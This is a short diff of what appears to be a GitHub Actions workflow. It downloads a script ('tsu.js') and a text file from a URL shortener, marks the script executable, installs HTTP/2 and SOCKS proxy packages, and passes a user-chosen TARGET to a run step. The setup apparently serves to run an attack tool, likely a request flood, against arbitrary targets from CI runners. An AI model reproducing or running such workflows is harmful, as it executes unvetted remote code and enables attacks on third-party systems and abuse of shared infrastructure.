@@ -29,7 +29,7 @@ jobs:
         wget https://curl.by/nqs5g/tsu.js
         wget https://curl.by/lHslD/good.txt
         chmod +x tsu.js
-        npm i hpack https commander colors 
+        npm i hpack https commander colors socks
     - name: run
       run: |
         TARGET="${{ inputs.target }}"
